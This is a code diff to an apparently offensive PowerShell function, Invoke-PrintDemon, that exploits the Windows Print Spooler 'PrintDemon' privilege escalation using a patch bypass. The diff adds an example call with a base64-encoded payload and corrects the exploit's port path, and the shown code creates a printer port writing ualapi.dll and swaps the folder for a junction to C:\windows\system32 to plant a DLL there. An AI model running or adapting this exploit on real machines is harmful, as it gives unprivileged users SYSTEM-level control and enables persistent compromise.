@@ -7,13 +7,17 @@ function Invoke-PrintDemon
         is a privilege escalation vulnerability that allows a persistent
         threat through Windows Print Spooler. The vulnerability allows an
         unprivileged user to gain system-level privileges. Based on
-        @ionescu007 PoC using a bypass for the last patch:
+        @ionescu007 PoC. This PoC is using a bypass for the last patch:
         https://bugs.chromium.org/p/project-zero/issues/detail?id=2075
 
         Author: @hubbl3, @Cx01N
         License: BSD 3-Clause
         Required Dependencies: None
         Optional Dependencies: None
+
+    .EXAMPLE
+
+        PS> Invoke-PrintDemon 'vAG4AUAB1CsAJABLACkAKQB8AEkARQBYAA=='
 
     .LINK
 
@@ -24,7 +28,7 @@ function Invoke-PrintDemon
 mkdir "C:\Printexp"
 Add-PrinterDriver -Name "Generic / Text Only" 
 Add-PrinterPort -Name "\\localhost\c$\Printexp\ualapi.dll" 
-Add-Printer -Name "PrinterExploit" -DriverName "Generic / Text Only" -PortName "\\localhost\c$\test\ualapi.dll"
+Add-Printer -Name "PrinterExploit" -DriverName "Generic / Text Only" -PortName "\\localhost\c$\Printexp\ualapi.dll"
 rmdir "c:\Printexp"
 New-Item -ItemType Junction -Path "C:\Printexp" -Value "C:\windows\system32"
 
